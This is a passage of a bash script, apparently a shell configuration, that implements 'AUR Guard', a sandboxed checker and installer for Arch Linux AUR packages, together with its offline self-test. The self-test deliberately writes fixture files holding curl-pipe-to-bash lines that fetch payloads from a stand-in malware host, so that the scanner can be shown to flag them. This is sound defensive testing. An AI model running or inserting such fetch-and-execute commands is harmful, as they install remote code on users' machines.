    usr/lib/tmpfiles.d/*|usr/lib/sysusers.d/*|\
    usr/lib/udev/rules.d/*|etc/udev/rules.d/*|\
    usr/share/polkit-1/rules.d/*|usr/share/polkit-1/actions/*|\
    usr/share/dbus-1/system-services/*|usr/share/dbus-1/services/*|\
    usr/lib/modules/*|usr/lib/modules-load.d/*|usr/lib/modprobe.d/*|\
    usr/lib/sysctl.d/*|usr/lib/binfmt.d/*|usr/lib/environment.d/*)
      return 0
      ;;
  esac

  return 1
}

_aur_guard_scan_artifact() {
  local pkgbase="$1"
  local artifact="$2"
  local scan_root="$3"
  local entry relative target resolved artifact_size file_count listing verbose_listing
  local metadata pkgbase_metadata pkgname_metadata metadata_value duplicate_path
  local copied_artifact="$scan_root/.artifact.pkg"

  artifact_size=$(stat -c %s "$artifact" 2>/dev/null) || return 1
  if (( artifact_size > _AUR_GUARD_ARTIFACT_MAX_BYTES )); then
    _aur_guard_fail "$pkgbase produced an artifact larger than the configured limit"
    return 1
  fi

  rm -rf "$scan_root"
  mkdir -p "$scan_root" || return 1
  listing="$scan_root/.archive-list"
  verbose_listing="$scan_root/.archive-list-verbose"

  if ! command bsdtar -tf "$artifact" > "$listing" \
      || ! command bsdtar -tvf "$artifact" > "$verbose_listing"; then
    _aur_guard_fail "$pkgbase produced an unreadable package archive"
    return 1
  fi

  file_count=$(wc -l < "$listing") || return 1
  if (( file_count > _AUR_GUARD_ARTIFACT_MAX_FILES )); then
    _aur_guard_fail "$pkgbase produced an artifact containing too many archive entries"
    return 1
  fi

  while IFS= read -r entry; do
    case "$entry" in
      /*|..|../*|*/../*|*/..)
        _aur_guard_fail "$pkgbase produced an archive with an unsafe path: $entry"
        return 1
        ;;
    esac
  done < "$listing"

  for metadata in .PKGINFO .BUILDINFO .MTREE; do
    if ! grep -Fxq -- "$metadata" "$listing"; then
      _aur_guard_fail "$pkgbase produced an artifact without required package metadata: $metadata"
      return 1
    fi
  done

  duplicate_path=$(
    sed -e 's#^\./##' -e 's#/*$##' "$listing" \
      | awk 'NF && seen[$0]++ {print; exit}'
  )
  if [[ -n "$duplicate_path" ]]; then
    _aur_guard_fail "$pkgbase produced an archive with a duplicate normalized path: $duplicate_path"
    return 1
  fi

  pkgbase_metadata=$(
    command bsdtar -xOf "$artifact" .PKGINFO 2>/dev/null \
      | awk -F ' = ' '$1 == "pkgbase" {print $2; exit}'
  )
  pkgname_metadata=$(
    command bsdtar -xOf "$artifact" .PKGINFO 2>/dev/null \
      | awk -F ' = ' '$1 == "pkgname" {print $2; exit}'
  )
  if [[ -z "$pkgbase_metadata" || "$pkgbase_metadata" != "$pkgbase" ]]; then
    _aur_guard_fail "$pkgbase produced an artifact claiming unexpected pkgbase: ${pkgbase_metadata:-missing}"
    return 1
  fi
  _aur_guard_validate_package_name "$pkgname_metadata" || return 1

  while IFS= read -r metadata_value; do
    [[ -n "$metadata_value" ]] || continue
    _aur_guard_add_context_warning \
      "$pkgname_metadata package replacement" \
      "Built metadata declares replaces=$metadata_value; pacman may remove or supersede another package."
  done < <(
    command bsdtar -xOf "$artifact" .PKGINFO 2>/dev/null \
      | awk -F ' = ' '$1 == "replaces" {print $2}'
  )

  while IFS= read -r metadata_value; do
    [[ -n "$metadata_value" ]] || continue
    _aur_guard_add_context_warning \
      "$pkgname_metadata package conflict" \
      "Built metadata declares conflict=$metadata_value; pacman may require removing a conflicting package."
  done < <(
    command bsdtar -xOf "$artifact" .PKGINFO 2>/dev/null \
      | awk -F ' = ' '$1 == "conflict" {print $2}'
  )

  if grep -E ' (->|link to) (/|\.\./|.*(/\.\./|/\.\.$))' "$verbose_listing"; then
    _aur_guard_fail "$pkgbase produced an archive with an unsafe symbolic-link or hard-link target"
    return 1
  fi

  rm -f "$listing" "$verbose_listing"
  ln "$artifact" "$copied_artifact" 2>/dev/null \
    || cp --reflink=auto -- "$artifact" "$copied_artifact" \
    || return 1

  if ! _aur_guard_sandbox_exec \
      "$scan_root" deny writable / \
      /usr/bin/bsdtar -xf /work/.artifact.pkg -C /work; then
    rm -f "$copied_artifact"
    _aur_guard_fail "could not safely extract built artifact for inspection: $artifact"
    return 1
  fi
  rm -f "$copied_artifact"

  if [[ -e "$scan_root/.INSTALL" ]]; then
    _aur_guard_fail "$pkgbase generated a pacman install script; root scriptlets are blocked by policy"
    return 1
  fi

  while IFS= read -r -d '' entry; do
    relative="${entry#"$scan_root"/}"
    if _aur_guard_artifact_path_is_blocked "$relative"; then
      _aur_guard_fail "$pkgbase installs a blocked privileged or auto-activation path: $relative"
      return 1
    fi
  done < <(find -P "$scan_root" -mindepth 1 -print0)

  if find -P "$scan_root" -xdev \( -type b -o -type c -o -type p -o -type s \) \
      -print -quit | grep -q .; then
    _aur_guard_fail "$pkgbase generated a device, FIFO, or socket entry"
    return 1
  fi

  if find -P "$scan_root" -xdev -type f -perm /6000 -print -quit | grep -q .; then
    _aur_guard_fail "$pkgbase generated a setuid or setgid file"
    return 1
  fi

  while IFS= read -r -d '' entry; do
    target=$(readlink -- "$entry") || return 1
    case "$target" in
      /*)
        _aur_guard_fail "$pkgbase generated an absolute symbolic link: ${entry#"$scan_root"/} -> $target"
        return 1
        ;;
    esac
    resolved=$(realpath -m -- "$(dirname -- "$entry")/$target") || return 1
    case "$resolved" in
      "$scan_root"|"$scan_root"/*)
        ;;
      *)
        _aur_guard_fail "$pkgbase generated a symbolic link escaping the package root: ${entry#"$scan_root"/} -> $target"
        return 1
        ;;
    esac
  done < <(find -P "$scan_root" -xdev -type l -print0)

  if type -P getcap >/dev/null 2>&1; then
    if command getcap -r "$scan_root" 2>/dev/null | grep -q .; then
      command getcap -r "$scan_root" 2>/dev/null >&2 || true
      _aur_guard_fail "$pkgbase generated files with Linux capabilities"
      return 1
    fi
  fi

  if type -P clamscan >/dev/null 2>&1; then
    if ! command clamscan --infected --recursive --no-summary "$scan_root"; then
      _aur_guard_fail "$pkgbase artifact failed the optional ClamAV scan"
      return 1
    fi
  fi

  _aur_guard_scan_source_tree "$pkgbase built artifact" "$scan_root" recursive
}

_aur_guard_build_verified_artifacts() {
  local requested_pkg="$1"
  local pkgbase expected remote parent pkgdir build_root
  local required required_base required_name pkgname artifact scan_root hash
  local -a artifacts=()

  while IFS=$'\t' read -r pkgbase expected remote parent pkgdir; do
    [[ -n "$pkgbase" && -d "$pkgdir" ]] || {
      _aur_guard_fail "verified package directory is missing for $pkgbase"
      return 1
    }

    build_root="$_AUR_GUARD_WORK_DIR/build-roots/${pkgbase//[^a-zA-Z0-9._+-]/_}"
    _aur_guard_prepare_build_root "$build_root" || {
      _aur_guard_fail "$pkgbase clean build-root creation failed"
      return 1
    }

    _aur_guard_install_prior_artifacts_into_root "$build_root" || {
      sudo rm -rf -- "$build_root"
      _aur_guard_fail "$pkgbase could not install previously verified AUR dependencies into its disposable build root"
      return 1
    }

    printf '\nAUR Guard: preparing %s from verified commit %s inside a disposable public-network sandbox.\n' \
      "$pkgbase" "${expected:0:12}"

    rm -rf "$pkgdir/.awtarchy-build" "$pkgdir/.awtarchy-pkg" \
      "$pkgdir/.awtarchy-log" "$pkgdir/.awtarchy-artifact-scan"
    mkdir -p "$pkgdir/.awtarchy-build" "$pkgdir/.awtarchy-pkg" \
      "$pkgdir/.awtarchy-log" "$pkgdir/.awtarchy-artifact-scan" || {
      sudo rm -rf -- "$build_root"
      return 1
    }

    _AUR_GUARD_SANDBOX_ROOTFS="$build_root"
    if ! _aur_guard_makepkg_sandbox "$pkgdir" allow writable \
        --nobuild --noverify --holdver --noconfirm --nocolor; then
      unset _AUR_GUARD_SANDBOX_ROOTFS
      sudo rm -rf -- "$build_root"
      _aur_guard_fail "$pkgbase failed its isolated network preparation step"
      return 1
    fi

    _aur_guard_assert_tracked_files_unchanged "$pkgbase" "$pkgdir" || {
      unset _AUR_GUARD_SANDBOX_ROOTFS
      sudo rm -rf -- "$build_root"
      return 1
    }

    _aur_guard_scan_source_tree \
      "$pkgbase prepared source tree" \
      "$pkgdir/.awtarchy-build" recursive || {
      unset _AUR_GUARD_SANDBOX_ROOTFS
      sudo rm -rf -- "$build_root"
      return 1
    }

    _aur_guard_scan_source_tree \
      "$pkgbase downloaded dependency cache" \
      "$pkgdir/.awtarchy-cache" recursive || {
      unset _AUR_GUARD_SANDBOX_ROOTFS
      sudo rm -rf -- "$build_root"
      return 1
    }

    printf 'AUR Guard: running build(), check(), and package() for %s with no network.\n' \
      "$pkgbase"

    if ! _aur_guard_makepkg_sandbox "$pkgdir" deny writable \
        --noextract --noprepare --noverify --holdver --check --noconfirm --nocolor; then
      unset _AUR_GUARD_SANDBOX_ROOTFS
      sudo rm -rf -- "$build_root"
      _aur_guard_fail "$pkgbase failed its offline clean-root build/check/package step"
      return 1
    fi
    unset _AUR_GUARD_SANDBOX_ROOTFS
    sudo rm -rf -- "$build_root"

    _aur_guard_assert_tracked_files_unchanged "$pkgbase" "$pkgdir" || return 1

    _aur_guard_scan_source_tree \
      "$pkgbase post-build source tree" \
      "$pkgdir/.awtarchy-build" recursive || return 1

    _aur_guard_scan_source_tree \
      "$pkgbase post-build dependency cache" \
      "$pkgdir/.awtarchy-cache" recursive || return 1

    _aur_guard_scan_source_tree \
      "$pkgbase post-build package workspace" \
      "$pkgdir" top || return 1

    mapfile -t artifacts < <(
      find "$pkgdir/.awtarchy-pkg" -maxdepth 1 -type f \
        -name '*.pkg.tar.*' ! -name '*.sig' -print | LC_ALL=C sort
    )
    if (( ${#artifacts[@]} == 0 )); then
      _aur_guard_fail "$pkgbase completed without producing a package artifact"
      return 1
    fi

    for artifact in "${artifacts[@]}"; do
      pkgname=$(_aur_guard_artifact_name "$artifact")
      [[ -n "$pkgname" ]] || {
        _aur_guard_fail "could not read package name from artifact: $artifact"
        return 1
      }
      _aur_guard_validate_package_name "$pkgname" || return 1

      scan_root="$pkgdir/.awtarchy-artifact-scan/${pkgname//[^a-zA-Z0-9._+-]/_}"
      _aur_guard_scan_artifact "$pkgbase" "$artifact" "$scan_root" || return 1

      required=false
      while IFS=$'\t' read -r required_base required_name; do
        if [[ "$required_base" == "$pkgbase" && "$required_name" == "$pkgname" ]]; then
          required=true
          break
        fi
      done < "$_AUR_GUARD_REQUIRED_PACKAGES"

      $required || continue

      if awk -F '\t' -v n="$pkgname" '$2 == n {found=1} END {exit !found}' \
          "$_AUR_GUARD_ARTIFACTS"; then
        _aur_guard_fail "multiple verified artifacts claim the same package name: $pkgname"
        return 1
      fi

      hash=$(sha256sum -- "$artifact" | awk '{print $1}') || return 1
      printf '%s\t%s\t%s\t%s\n' "$pkgbase" "$pkgname" "$artifact" "$hash" \
        >> "$_AUR_GUARD_ARTIFACTS"
    done

    while IFS=$'\t' read -r required_base required_name; do
      [[ "$required_base" == "$pkgbase" ]] || continue
      if ! awk -F '\t' -v b="$pkgbase" -v n="$required_name" \
          '$1 == b && $2 == n {found=1} END {exit !found}' \
          "$_AUR_GUARD_ARTIFACTS"; then
        _aur_guard_fail "$pkgbase did not produce required split package $required_name"
        return 1
      fi
    done < "$_AUR_GUARD_REQUIRED_PACKAGES"
  done < "$_AUR_GUARD_MANIFEST"

  if ! awk -F '\t' -v n="$requested_pkg" \
      '$2 == n {found=1} END {exit !found}' "$_AUR_GUARD_ARTIFACTS"; then
    _aur_guard_fail "no verified artifact was produced for requested package $requested_pkg"
    return 1
  fi
}

_aur_guard_verify_artifact_hashes() {
  local pkgbase pkgname artifact expected actual

  while IFS=$'\t' read -r pkgbase pkgname artifact expected; do
    [[ -f "$artifact" ]] || {
      _aur_guard_fail "verified artifact disappeared before installation: $artifact"
      return 1
    }
    actual=$(sha256sum -- "$artifact" | awk '{print $1}') || return 1
    if [[ "$actual" != "$expected" ]]; then
      _aur_guard_fail "verified artifact changed before installation: $artifact"
      return 1
    fi
  done < "$_AUR_GUARD_ARTIFACTS"
}

_aur_guard_install_verified_transaction() {
  local requested_pkg="$1"
  local pkgbase pkgname artifact hash reason
  local -a artifacts=()
  local -a mark_asdeps=()

  _aur_guard_verify_artifact_hashes || return 1

  while IFS=$'\t' read -r pkgbase pkgname artifact hash; do
    [[ -n "$artifact" ]] || continue
    artifacts+=("$artifact")

    if [[ "$pkgname" != "$requested_pkg" ]]; then
      reason=$(command pacman -Qi "$pkgname" 2>/dev/null \
        | awk -F ': ' '/^Install Reason/ {print $2; exit}')
      if [[ "$reason" != 'Explicitly installed' ]]; then
        mark_asdeps+=("$pkgname")
      fi
    fi
  done < "$_AUR_GUARD_ARTIFACTS"

  (( ${#artifacts[@]} > 0 )) || return 1
  _aur_guard_verify_artifact_hashes || return 1
  _AUR_GUARD_INSTALL_STARTED=1

  printf '\nAUR Guard: installing every verified AUR artifact and required repository dependency in one pacman transaction.\n'
  if ! sudo pacman -U --needed "${artifacts[@]}"; then
    return 1
  fi

  if (( ${#mark_asdeps[@]} > 0 )); then
    sudo pacman -D --asdeps "${mark_asdeps[@]}" || return 1
  fi
  sudo pacman -D --asexplicit "$requested_pkg" || return 1
}

_aur_guard_verify_tree() {
  local pkg="$1"

  type -P makepkg >/dev/null 2>&1 || {
    _aur_guard_fail 'makepkg is required'
    return 127
  }

  type -P git >/dev/null 2>&1 || {
    _aur_guard_fail 'git is required'
    return 127
  }

  type -P bwrap >/dev/null 2>&1 || {
    _aur_guard_fail 'bubblewrap is required. Install it with: sudo pacman -S bubblewrap'
    return 127
  }

  type -P systemd-run >/dev/null 2>&1 || {
    _aur_guard_fail 'systemd-run is required for cgroup resource and network filtering'
    return 127
  }

  type -P pasta >/dev/null 2>&1 || {
    _aur_guard_fail 'pasta from passt is required for an isolated network namespace. Install it with: sudo pacman -S passt'
    return 127
  }

  type -P mkarchroot >/dev/null 2>&1 || {
    _aur_guard_fail 'mkarchroot from devtools is required. Install it with: sudo pacman -S devtools'
    return 127
  }

  type -P arch-nspawn >/dev/null 2>&1 || {
    _aur_guard_fail 'arch-nspawn from devtools is required. Install it with: sudo pacman -S devtools'
    return 127
  }


  type -P timeout >/dev/null 2>&1 || {
    _aur_guard_fail 'timeout from coreutils is required'
    return 127
  }

  type -P gpg >/dev/null 2>&1 || {
    _aur_guard_fail 'gpg is required for isolated PGP source verification'
    return 127
  }

  type -P jq >/dev/null 2>&1 || {
    _aur_guard_fail 'jq is required for safe AUR virtual dependency resolution'
    return 127
  }

  type -P bsdtar >/dev/null 2>&1 || {
    _aur_guard_fail 'bsdtar from libarchive is required for built-package inspection'
    return 127
  }

  if ! type -P curl >/dev/null 2>&1 && ! type -P wget >/dev/null 2>&1; then
    _aur_guard_fail 'curl or wget is required to check historical AUR incident lists'
    return 127
  fi

  if [[ ${AUR_GUARD_TEST_MODE:-0} != 1 ]]; then
    if ! command systemd-run --user --wait --pipe --collect --quiet \
        --property=Type=exec \
        --property=IPAddressDeny=any \
        /usr/bin/true >/dev/null 2>&1; then
      _aur_guard_fail 'the per-user systemd manager cannot enforce cgroup IP filtering for transient sandbox services'
      return 1
    fi

    if type -P curl >/dev/null 2>&1; then
      if command systemd-run --user --wait --pipe --collect --quiet \
          --property=Type=exec \
          --property=IPAddressDeny=any \
          /usr/bin/curl --fail --silent --show-error --max-time 5 \
          "$_AUR_GUARD_NETWORK_TEST_URL" >/dev/null 2>&1; then
        _aur_guard_fail 'systemd cgroup IP filtering is unavailable or ineffective; refusing a network-enabled AUR sandbox'
        return 1
      fi
    else
      if command systemd-run --user --wait --pipe --collect --quiet \
          --property=Type=exec \
          --property=IPAddressDeny=any \
          /usr/bin/wget --quiet --timeout=5 --output-document=/dev/null \
          "$_AUR_GUARD_NETWORK_TEST_URL" >/dev/null 2>&1; then
        _aur_guard_fail 'systemd cgroup IP filtering is unavailable or ineffective; refusing a network-enabled AUR sandbox'
        return 1
      fi
    fi
  fi

  _aur_guard_refresh_blacklists || return 1

  _AUR_GUARD_WORK_DIR=$(mktemp -d) || return 1
  _AUR_GUARD_MANIFEST="$_AUR_GUARD_WORK_DIR/verified-packages.tsv"
  _AUR_GUARD_REQUIRED_PACKAGES="$_AUR_GUARD_WORK_DIR/required-packages.tsv"
  _AUR_GUARD_REPO_DEPS="$_AUR_GUARD_WORK_DIR/repository-dependencies.txt"
  _AUR_GUARD_ARTIFACTS="$_AUR_GUARD_WORK_DIR/built-artifacts.tsv"
  : > "$_AUR_GUARD_MANIFEST"
  : > "$_AUR_GUARD_REQUIRED_PACKAGES"
  : > "$_AUR_GUARD_REPO_DEPS"
  : > "$_AUR_GUARD_ARTIFACTS"

  declare -gA _AUR_GUARD_REQUEST_STATE=()
  declare -gA _AUR_GUARD_BASE_STATE=()
  _AUR_GUARD_HISTORICAL_MATCHES=()
  _AUR_GUARD_CONTEXT_WARNINGS=()
  _AUR_GUARD_INSTALL_STARTED=0

  printf 'AUR Verify: recursively checking %s and all required AUR dependencies.\n' "$pkg"
  _aur_guard_verify_package_recursive "$pkg" '(requested)' || return 1

  printf '\nVerified AUR package bases:\n'
  awk -F '\t' '{printf "  %-36s %s\n", $1, substr($2, 1, 12)}' \
    "$_AUR_GUARD_MANIFEST"

  if _aur_guard_has_context_warnings; then
    _aur_guard_print_context_summary
  fi
}

_aur_guard_cleanup_work() {
  if [[ -n ${_AUR_GUARD_WORK_DIR:-} && -d $_AUR_GUARD_WORK_DIR/build-roots ]]; then
    sudo rm -rf -- "$_AUR_GUARD_WORK_DIR/build-roots" 2>/dev/null || true
  fi
  if [[ -n ${_AUR_GUARD_WORK_DIR:-} && -d $_AUR_GUARD_WORK_DIR ]]; then
    rm -rf "$_AUR_GUARD_WORK_DIR"
  fi
  unset _AUR_GUARD_WORK_DIR _AUR_GUARD_MANIFEST _AUR_GUARD_HELPER
  unset _AUR_GUARD_SANDBOX_ROOTFS _AUR_GUARD_INSTALL_STARTED
  unset _AUR_GUARD_REQUIRED_PACKAGES _AUR_GUARD_REPO_DEPS _AUR_GUARD_ARTIFACTS
  unset _AUR_GUARD_REQUEST_STATE _AUR_GUARD_BASE_STATE
  _AUR_GUARD_HISTORICAL_MATCHES=()
  _AUR_GUARD_CONTEXT_WARNINGS=()
}

aurguardtest() (
  local test_root test_bin helper_log network_log historical_output
  local aurup_output wrapper_output aurup_status
  local tool

  test_root=$(mktemp -d) || return 1
  trap 'rm -rf "$test_root"' EXIT

  test_bin="$test_root/bin"
  helper_log="$test_root/helper-called.log"
  network_log="$test_root/network-called.log"
  historical_output="$test_root/historical-output.log"
  mkdir -p "$test_bin" "$test_root/cache"

  for tool in makepkg git jq bwrap gpg timeout bsdtar systemd-run pasta mkarchroot arch-nspawn sha256sum realpath; do
    printf '%s\n' '#!/bin/sh' 'exit 0' > "$test_bin/$tool"
  done

  cat > "$test_bin/curl" <<'AUR_GUARD_TEST_CURL'
#!/bin/sh
printf '%s\n' "$*" >> "${AUR_GUARD_TEST_NETWORK_LOG:?}"
exit 99
AUR_GUARD_TEST_CURL

  printf '%s\n' '#!/bin/sh' 'exit 1' > "$test_bin/pacman"

  cat > "$test_bin/yay" <<'AUR_GUARD_TEST_HELPER'
#!/bin/sh
printf '%s\n' "$*" >> "${AUR_GUARD_TEST_HELPER_LOG:?}"
exit 99
AUR_GUARD_TEST_HELPER

  cp "$test_bin/yay" "$test_bin/paru"
  chmod 0755 "$test_bin"/*

  export AUR_GUARD_TEST_HELPER_LOG="$helper_log"
  export AUR_GUARD_TEST_NETWORK_LOG="$network_log"
  export AUR_GUARD_TEST_MODE=1
  PATH="$test_bin:$PATH"
  export PATH

  _AUR_GUARD_CACHE_DIR="$test_root/cache"
  printf '%s\n' \
    'vesktop-bin-patched' \
    'historical-only-test' \
    > "$_AUR_GUARD_CACHE_DIR/arch-malware-list.names"
  printf '%s\n' \
    'vesktop-bin-patched' \
    'historical-only-test' \
    > "$_AUR_GUARD_CACHE_DIR/github-malware-list.names"

  # Keep this test offline and deterministic. The files above simulate both
  # historical incident-list sources after a successful refresh.
  _aur_guard_refresh_blacklists() {
    return 0
  }

  printf 'AUR Guard self-test: emergency-blocked packages must be refused.\n'
  aurup_output=$(aurup vesktop-bin-patched 2>&1)
  aurup_status=$?
  printf '%s\n' "$aurup_output"

  if (( aurup_status == 0 )); then
    _aur_guard_fail 'self-test failed: aurup returned success for an emergency-blocked package'
    return 1
  fi

  if [[ -s "$helper_log" ]]; then
    _aur_guard_fail 'self-test failed: the external AUR helper was invoked'
    return 1
  fi

  if ! command grep -Fq \
      'Awtarchy refused to install: vesktop-bin-patched' <<< "$aurup_output"; then
    _aur_guard_fail 'self-test failed: expected refusal message was not produced'
    return 1
  fi

  if ! command grep -Fq \
      'emergency blocklist' <<< "$aurup_output"; then
    _aur_guard_fail 'self-test failed: refusal did not identify the emergency blocklist match'
    return 1
  fi

  printf '\nAUR Guard self-test: historical incident names must warn instead of hard-blocking.\n'
  _AUR_GUARD_HISTORICAL_MATCHES=()
  _AUR_GUARD_CONTEXT_WARNINGS=()
  if ! _aur_guard_note_historical_match \
      'historical-only-test' > "$historical_output" 2>&1; then
    cat "$historical_output"
    _aur_guard_fail 'self-test failed: historical incident warning returned failure'
    return 1
  fi
  cat "$historical_output"

  if [[ ! ${_AUR_GUARD_HISTORICAL_MATCHES[historical-only-test]+set} ]]; then
    _aur_guard_fail 'self-test failed: historical incident match was not recorded'
    return 1
  fi

  if ! _aur_guard_check_emergency_block 'historical-only-test'; then
    _aur_guard_fail 'self-test failed: a historical-only package was incorrectly hard-blocked'
    return 1
  fi

  if _aur_guard_confirm_guarded_install \
      'historical-only-test' <<< 'NO'; then
    _aur_guard_fail 'self-test failed: incorrect historical confirmation was accepted'
    return 1
  fi

  if ! _aur_guard_confirm_guarded_install \
      'historical-only-test' <<< 'INSTALL historical-only-test'; then
    _aur_guard_fail 'self-test failed: exact historical confirmation was rejected'
    return 1
  fi

  printf '\nAUR Guard self-test: suspicious JavaScript package-manager dependencies require source evidence.\n'
  mkdir -p "$test_root/js-mismatch/source" "$test_root/js-valid/source"
  printf '%s\n' 'makedepends = bun' > "$test_root/js-mismatch/.SRCINFO"
  printf '%s\n' 'bun build' > "$test_root/js-mismatch/PKGBUILD"

  if _aur_guard_validate_dependency_evidence \
      'js-mismatch' \
      "$test_root/js-mismatch/.SRCINFO" \
      "$test_root/js-mismatch" \
      "$test_root/js-mismatch/source"; then
    _aur_guard_fail 'self-test failed: Bun dependency without package.json passed validation'
    return 1
  fi

  printf '%s\n' 'makedepends = bun' > "$test_root/js-valid/.SRCINFO"
  printf '%s\n' 'bun build' > "$test_root/js-valid/PKGBUILD"
  printf '%s\n' '{"name":"test"}' > "$test_root/js-valid/source/package.json"
  : > "$test_root/js-valid/source/bun.lock"

  if ! _aur_guard_validate_dependency_evidence \
      'js-valid' \
      "$test_root/js-valid/.SRCINFO" \
      "$test_root/js-valid" \
      "$test_root/js-valid/source"; then
    _aur_guard_fail 'self-test failed: Bun dependency with matching manifests was rejected'
    return 1
  fi

  printf '\nAUR Guard self-test: raw yay -S must also be blocked.\n'
  if wrapper_output=$(yay -S vesktop-bin-patched 2>&1); then
    printf '%s\n' "$wrapper_output"
    _aur_guard_fail 'self-test failed: wrapped yay returned success'
    return 1
  fi
  printf '%s\n' "$wrapper_output"

  if [[ -s "$helper_log" ]]; then
    _aur_guard_fail 'self-test failed: raw yay reached the external helper'
    return 1
  fi

  local direct_command
  for direct_command in \
      'yay -Qm' \
      'yay -G example' \
      'yay -Ss example' \
      'yay --version' \
      'paru -Qm' \
      'paru --version'; do
    if wrapper_output=$(eval "$direct_command" 2>&1); then
      printf '%s\n' "$wrapper_output"
      _aur_guard_fail "self-test failed: direct helper command returned success: $direct_command"
      return 1
    fi
  done

  if [[ -s "$helper_log" ]]; then
    _aur_guard_fail 'self-test failed: a direct yay/paru command reached the external helper'
    return 1
  fi

  if _aur_guard_validate_package_name '--config'; then
    _aur_guard_fail 'self-test failed: option-shaped package name passed validation'
    return 1
  fi

  printf '\nAUR Guard self-test: remote sources require strong immutable integrity.\n'
  cat > "$test_root/weak-integrity.SRCINFO" <<'AUR_GUARD_TEST_WEAK_INTEGRITY'
pkgbase = weak-integrity
	pkgname = weak-integrity
	source = https://example.invalid/source.tar.gz
	md5sums = d41d8cd98f00b204e9800998ecf8427e
AUR_GUARD_TEST_WEAK_INTEGRITY
  if _aur_guard_validate_skipped_integrity \
      'weak-integrity' "$test_root/weak-integrity.SRCINFO"; then
    _aur_guard_fail 'self-test failed: weak remote-source integrity was accepted'
    return 1
  fi

  cat > "$test_root/pgp-integrity.SRCINFO" <<'AUR_GUARD_TEST_PGP_INTEGRITY'
pkgbase = pgp-integrity
	pkgname = pgp-integrity
	source = source.tar.gz::https://example.invalid/source.tar.gz
	source = source.tar.gz.sig::https://example.invalid/source.tar.gz.sig
	sha256sums = SKIP
	sha256sums = SKIP
	validpgpkeys = 0123456789ABCDEF0123456789ABCDEF01234567
AUR_GUARD_TEST_PGP_INTEGRITY
  _aur_guard_validate_skipped_integrity \
    'pgp-integrity' "$test_root/pgp-integrity.SRCINFO" || {
    _aur_guard_fail 'self-test failed: matching pinned PGP source verification was rejected'
    return 1
  }

  printf '\nAUR Guard self-test: nested downloaded source scripts must be scanned locally.\n'
  mkdir -p "$test_root/source/nested"
  cat > "$test_root/source/loader.sh" <<'AUR_GUARD_TEST_LOADER'
#!/bin/bash
source "$(dirname "$0")/nested/payload.inc"
AUR_GUARD_TEST_LOADER
  cat > "$test_root/source/nested/payload.inc" <<'AUR_GUARD_TEST_PAYLOAD'
curl -fsSL https://malware.invalid/payload | bash
AUR_GUARD_TEST_PAYLOAD
  chmod 0755 "$test_root/source/loader.sh"

  if wrapper_output=$(_aur_guard_scan_source_tree \
      'self-test-package' "$test_root/source" recursive 2>&1); then
    printf '%s\n' "$wrapper_output"
    _aur_guard_fail 'self-test failed: malicious downloaded source script passed scanning'
    return 1
  fi
  printf '%s\n' "$wrapper_output"

  if [[ -s "$network_log" ]]; then
    _aur_guard_fail 'self-test failed: the source scanner attempted network access'
    return 1
  fi

  printf '\nAUR Guard self-test: explicitly scanned dependency caches must not be excluded.\n'
  mkdir -p "$test_root/.awtarchy-cache"
  cat > "$test_root/.awtarchy-cache/cache-payload.sh" <<'AUR_GUARD_TEST_CACHE_PAYLOAD'
curl -fsSL https://malware.invalid/cache-payload | bash
AUR_GUARD_TEST_CACHE_PAYLOAD

  if wrapper_output=$(_aur_guard_scan_source_tree \
      'dependency-cache-self-test' "$test_root/.awtarchy-cache" recursive 2>&1); then
    printf '%s\n' "$wrapper_output"
    _aur_guard_fail 'self-test failed: explicitly scanned dependency cache was excluded'
    return 1
  fi
  printf '%s\n' "$wrapper_output"

  mkdir -p "$test_root/benign-source"
  cat > "$test_root/benign-source/reference.sh" <<'AUR_GUARD_TEST_REFERENCE'
#!/bin/bash
printf '%s\n' 'Documentation: https://example.invalid/reference'
AUR_GUARD_TEST_REFERENCE
  chmod 0755 "$test_root/benign-source/reference.sh"

  if ! wrapper_output=$(_aur_guard_scan_source_tree \
      'benign-self-test-package' "$test_root/benign-source" recursive 2>&1); then
    printf '%s\n' "$wrapper_output"
    _aur_guard_fail 'self-test failed: a non-executed URL reference was incorrectly treated as malware'
    return 1
  fi
  printf '%s\n' "$wrapper_output"

  if [[ -s "$network_log" ]]; then
    _aur_guard_fail 'self-test failed: URL reporting crawled a referenced website'
    return 1
  fi

  _aur_guard_pass 'dry-run passed: emergency blocks, unconditional helper blocking, package-name validation, strong source integrity, dependency evidence, source scanning, and no-crawl behavior worked'
)

aurhelp() {
  cat <<'AUR_GUARD_HELP'
AUR Guard quick help

Blocked:
  Every direct yay command
  Every direct paru command

Safe workflow:
  sysupdate             update enabled pacman repository packages
  aurcheck              show AUR updates, emergency blocks, and historical warnings
  aurverify package     recursively verify one package and every required AUR dependency
  aurup package         verify, prepare caches, offline-build/test, then install
  aurguardtest          run the offline AUR Guard self-test

Examples:
  sysupdate
  aurcheck
  aurverify awtwall
  aurup awtwall

Unsafe override:
  aurunsafe yay -S package
  aurunsafe yay -Syu
  aurunsafe paru -S package
  aurunsafe paru -Syu

Important:
  AUR packages are not official Arch packages.
  The downloaded incident lists are historical affected-package records.
  Historical and dependency-context warnings require explicit install confirmation.
  Only the built-in emergency list and current malicious patterns hard-block installation.
  AUR RPC, Git, helper update checks, source downloads, and PKGBUILD execution are sandboxed.
  Network-enabled sandboxes block loopback, LAN, link-local, Tailscale CGNAT, and multicast ranges.
  Build dependencies and earlier AUR artifacts exist only inside disposable clean Arch roots.
  prepare() runs in the restricted public-network sandbox; build(), check(), and package() run with no network.
  Pacman install scripts, setuid/setgid files, capabilities, special files, and privileged auto-activation paths are blocked.
  Every final artifact is scanned, hashed, rechecked, and installed in one pacman transaction.
  Source verification requires strong checksums, exact VCS commits, or matching signatures pinned by validpgpkeys.
  Pattern scanning still cannot prove that upstream source code is harmless.
AUR_GUARD_HELP
}

sysupdate() {
  sudo pacman -Syu
}

aurcheck() {
  local helper output pkg
  local hard_blocked=false

  helper=$(_aur_guard_pick_helper) || {
    _aur_guard_fail 'no yay or paru found'
    return 127
  }
  _aur_guard_refresh_blacklists || return 1
  _AUR_GUARD_HISTORICAL_MATCHES=()

  local helper_work
  helper_work=$(mktemp -d) || return 1
  output=$(
    _aur_guard_sandbox_exec "$helper_work" allow writable / \
      "$helper" -Qua
  )
  local helper_status=$?
  rm -rf "$helper_work"
  (( helper_status == 0 )) || return "$helper_status"
  if [[ -z "$output" ]]; then
    printf 'No AUR updates available.\n'
    return 0
  fi

  printf '%s\n' "$output"
  printf '\nAUR Guard incident check:\n'

  while IFS= read -r pkg; do
    [[ -n "$pkg" ]] || continue

    if ! _aur_guard_check_emergency_block "$pkg"; then
      hard_blocked=true
      continue
    fi

    _aur_guard_note_historical_match "$pkg"
  done < <(awk '{print $1}' <<< "$output" | LC_ALL=C sort -u)

